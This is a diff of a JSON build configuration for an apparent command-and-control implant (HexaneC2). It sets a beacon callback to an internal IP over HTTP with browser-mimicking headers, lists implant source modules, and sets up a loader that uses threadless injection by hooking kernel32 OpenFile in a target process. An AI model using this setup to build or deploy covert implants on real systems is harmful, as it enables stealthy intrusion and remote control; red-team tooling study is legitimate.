@@ -1,32 +1,60 @@
 {
-  "ImplantName": "moms",
-
   "Config": {
     "Arch": "amd64",
     "Debug": false,
-    "BuildType": "bin",
-    "Hostname": "LENOVO-WRKSTN-L",
+    "Hostname": "LENOVO-WRKSTN-W",
     "Sleeptime": 3,
     "Jitter": 10
   },
 
   "Network": {
-    "ProfileType": "http",
-    "Domain": null,
-    "Useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
-    "Address": "10.0.0.212",
-    "Port": 80,
+    "Type": "http",
+    "Config": {
+      "Useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
+      "Address": "10.0.0.212",
+      "Port": 80,
 
-    "Endpoints": [
-      "/endpoint1",
-      "/endpoint2",
-      "/endpoint3",
-      "/endpoint4",
-      "/endpoint5"
+      "Endpoints": [
+        "/endpoint0","/endpoint1", "/endpoint2", "/endpoint3", "/endpoint4",
+        "/endpoint5", "/endpoint6", "/endpoint7", "/endpoint8", "/endpoint9"
+      ]
+    }
+  },
+
+  "Builder": {
+    "OutputName": "test_implant",
+    "RootDirectory": "C:/Users/lemur/CLionProjects/HexaneC2/core",
+    "LinkerScript": "implant.ld",
+
+    "Dependencies": [],
+    "Sources": [
+      "cipher.cpp", "commands.cpp", "cruntime.cpp", "inject.cpp", "memory.cpp", "message.cpp",
+      "network.cpp", "opsec.cpp", "parser.cpp", "process.cpp", "start.asm", "stream.cpp",
+      "utils.cpp", "implant.cpp"
+    ],
+    "Egg": "0xde,0xad,0xbe,0xef"
+  },
+
+  "Loader": {
+    "RootDirectory": "C:/Users/lemur/CLionProjects/HexaneC2/loader",
+    "LinkerScript": "loader.ld",
+    "RsrcScript": "resource.rc",
+    "RsrcBinary": "lolwat.bin",
+
+    "Dependencies":[],
+    "Sources": [
+      "dllmain.cpp", "resource.cpp"
     ],
 
-    "Proxy":{
-      "Enabled": false
+    "Injection": {
+      "Type": "threadless",
+      "Config": {
+        "TargetProc": "blobrunner64.exe",
+        "TargetModule":"kernel32.dll",
+        "TargetFunc":"OpenFile",
+        "LoaderAsm": "C:/Users/lemur/CLionProjects/HexaneC2/inject/threadless/loader.asm",
+        "Execute":"C:/Users/lemur/CLionProjects/HexaneC2/inject/threadless/OpenFileExecute.cpp"
+      }
     }
   }
 }
